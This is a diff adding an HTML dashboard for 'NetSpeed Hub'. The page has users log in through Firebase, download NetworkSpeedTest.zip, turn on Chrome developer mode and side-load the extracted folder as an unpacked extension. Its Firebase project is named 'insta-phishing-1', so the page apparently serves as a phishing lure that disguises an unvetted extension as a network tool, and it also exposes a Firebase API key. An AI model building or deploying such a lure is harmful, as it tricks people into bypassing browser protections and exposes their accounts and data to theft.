@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NetSpeed | Hub</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap');
+        
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f8fafc;
+        }
+
+        .glass-nav {
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(234, 179, 8, 0.1);
+        }
+
+        .glass-card {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 1);
+            box-shadow: 0 10px 40px -10px rgba(234, 179, 8, 0.1);
+        }
+
+        .gold-btn {
+            background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%);
+            box-shadow: 0 4px 20px rgba(245, 158, 11, 0.4);
+            transition: all 0.3s;
+        }
+        .gold-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(245, 158, 11, 0.5);
+        }
+
+        .step-num {
+            background: linear-gradient(135deg, #fef3c7 0%, #fcd34d 100%);
+            color: #92400e;
+        }
+    </style>
+</head>
+<body class="min-h-screen text-slate-800 relative">
+
+    <!-- STRICT ROUTE GUARD LOADER -->
+    <!-- Blocks view until auth is verified -->
+    <div id="page-loader" class="fixed inset-0 z-[100] flex items-center justify-center bg-slate-50 transition-opacity duration-500">
+        <div class="flex flex-col items-center gap-4">
+            <div class="animate-spin rounded-full h-12 w-12 border-4 border-yellow-100 border-t-yellow-500"></div>
+            <p class="text-sm font-bold text-slate-400 animate-pulse">VERIFYING CREDENTIALS...</p>
+        </div>
+    </div>
+
+    <!-- Navbar -->
+    <nav class="glass-nav fixed w-full z-50 top-0">
+        <div class="max-w-6xl mx-auto px-6 h-20 flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <div class="bg-yellow-100 p-2 rounded-lg">
+                    <i data-lucide="zap" class="w-5 h-5 text-yellow-600"></i>
+                </div>
+                <span class="font-bold text-xl tracking-tight">NetSpeed<span class="text-yellow-600">Hub</span></span>
+            </div>
+            <div class="flex items-center gap-4">
+                <span id="user-email" class="text-sm font-medium text-slate-500 hidden sm:block"></span>
+                <button onclick="logout()" class="flex items-center gap-2 text-sm font-bold text-slate-600 hover:text-red-500 transition-colors">
+                    Log out <i data-lucide="log-out" class="w-4 h-4"></i>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="pt-32 pb-20 px-6">
+        <div class="max-w-4xl mx-auto">
+            
+            <!-- Hero Section -->
+            <div class="glass-card rounded-3xl p-10 md:p-14 text-center relative overflow-hidden mb-10">
+                <!-- Decoration -->
+                <div class="absolute -top-24 -right-24 w-64 h-64 bg-yellow-400/20 rounded-full blur-3xl"></div>
+                <div class="absolute -bottom-24 -left-24 w-64 h-64 bg-amber-400/20 rounded-full blur-3xl"></div>
+
+                <div class="relative z-10">
+                    <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-yellow-50 border border-yellow-200 text-yellow-700 text-sm font-bold mb-6">
+                        <span class="relative flex h-2 w-2">
+                          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-yellow-400 opacity-75"></span>
+                          <span class="relative inline-flex rounded-full h-2 w-2 bg-yellow-500"></span>
+                        </span>
+                        V12.0 Enterprise Available
+                    </div>
+                    <h1 class="text-4xl md:text-5xl font-extrabold text-slate-900 mb-6 leading-tight">
+                        Network Intelligence <br>
+                        <span class="text-transparent bg-clip-text bg-gradient-to-r from-yellow-500 to-amber-600">Redefined.</span>
+                    </h1>
+                    <p class="text-lg text-slate-500 mb-10 max-w-2xl mx-auto">
+                        Secure, low-latency monitoring for advanced network diagnostics. 
+                        Download the protocol package below to initialize.
+                    </p>
+                    
+                    <a href="NetworkSpeedTest.zip" download class="gold-btn text-white px-8 py-4 rounded-xl font-bold text-lg inline-flex items-center gap-3" aria-label="Download NetworkSpeedTest.zip" title="Download NetworkSpeedTest.zip">
+                        <i data-lucide="download-cloud" class="w-6 h-6"></i>
+                        Download Package
+                    </a>
+                </div>
+            </div>
+
+            <!-- Installation Steps -->
+            <div class="grid md:grid-cols-2 gap-6">
+                <!-- Step 1 -->
+                <div class="glass-card p-8 rounded-2xl hover:bg-white/80 transition">
+                    <div class="step-num w-10 h-10 rounded-xl flex items-center justify-center font-bold text-lg mb-4">1</div>
+                    <h3 class="text-xl font-bold mb-2">Extract Core</h3>
+                    <p class="text-slate-500 text-sm">Unzip the downloaded archive to a secure location on your local drive.</p>
+                </div>
+
+                <!-- Step 2 -->
+                <div class="glass-card p-8 rounded-2xl hover:bg-white/80 transition border-yellow-400/30">
+                    <div class="step-num w-10 h-10 rounded-xl flex items-center justify-center font-bold text-lg mb-4">2</div>
+                    <h3 class="text-xl font-bold mb-2">Inject Protocol</h3>
+                    <p class="text-slate-500 text-sm mb-4">Navigate to the extensions protocol in your browser.</p>
+                    
+                    <div class="bg-slate-100 rounded-lg p-3 flex items-center justify-between border border-slate-200 group">
+                        <code class="text-sm font-mono text-slate-600">chrome://extensions</code>
+                        <button onclick="copyLink()" class="p-2 hover:bg-white rounded-md transition text-slate-400 hover:text-yellow-600 group-hover:scale-110">
+                            <i data-lucide="copy" class="w-4 h-4"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Step 3 -->
+                <div class="glass-card p-8 rounded-2xl hover:bg-white/80 transition">
+                    <div class="step-num w-10 h-10 rounded-xl flex items-center justify-center font-bold text-lg mb-4">3</div>
+                    <h3 class="text-xl font-bold mb-2">Dev Mode</h3>
+                    <p class="text-slate-500 text-sm">Toggle "Developer mode" in the top right corner to enable side-loading.</p>
+                </div>
+
+                <!-- Step 4 -->
+                <div class="glass-card p-8 rounded-2xl hover:bg-white/80 transition">
+                    <div class="step-num w-10 h-10 rounded-xl flex items-center justify-center font-bold text-lg mb-4">4</div>
+                    <h3 class="text-xl font-bold mb-2">Load Extension</h3>
+                    <p class="text-slate-500 text-sm">Load Unpacked option is shown in top left corner<br>Select your extracted folder. Use <span class="bg-yellow-100 text-yellow-800 px-1 rounded font-mono text-xs">Alt+X</span> to verify.</p>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getFirestore, doc, getDoc, updateDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCrLIIP2uyjE5gYxYtp3I89EUoHyBSZQcg",
+            authDomain: "insta-phishing-1.firebaseapp.com",
+            databaseURL: "https://insta-phishing-1-default-rtdb.firebaseio.com",
+            projectId: "insta-phishing-1",
+            storageBucket: "insta-phishing-1.firebasestorage.app",
+            messagingSenderId: "372183742653",
+            appId: "1:372183742653:web:75c49f2bac2f4167d39fd4"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        const loader = document.getElementById('page-loader');
+
+        onAuthStateChanged(auth, async (user) => {
+            // 1. Unauthenticated Check
+            if (!user) {
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            try {
+                // 2. Security Clearance Check
+                const snap = await getDoc(doc(db, "users", user.uid));
+                const userData = snap.exists() ? snap.data() : null;
+
+                if(!userData || userData.isBlocked) {
+                    await signOut(auth);
+                    window.location.href = 'index.html';
+                    return;
+                }
+                
+                // 3. Admin Redirection (Admins belong in the cockpit, not the passenger seat)
+                if(userData.role === 'admin') {
+                    window.location.href = 'admin.html';
+                    return;
+                }
+
+                // 4. Access Granted - Reveal Dashboard
+                document.getElementById('user-email').innerText = user.email;
+                
+                // Fade out loader
+                loader.style.opacity = '0';
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                }, 500);
+
+            } catch (error) {
+                console.error("Route Guard Error:", error);
+                // Fallback to safe zone
+                window.location.href = 'index.html';
+            }
+        });
+
+        window.logout = () => signOut(auth);
+        window.copyLink = () => {
+            navigator.clipboard.writeText('chrome://extensions');
+            alert('Copied to clipboard!');
+        }
+        
+        lucide.createIcons();
+    </script>
+</body>
+</html>
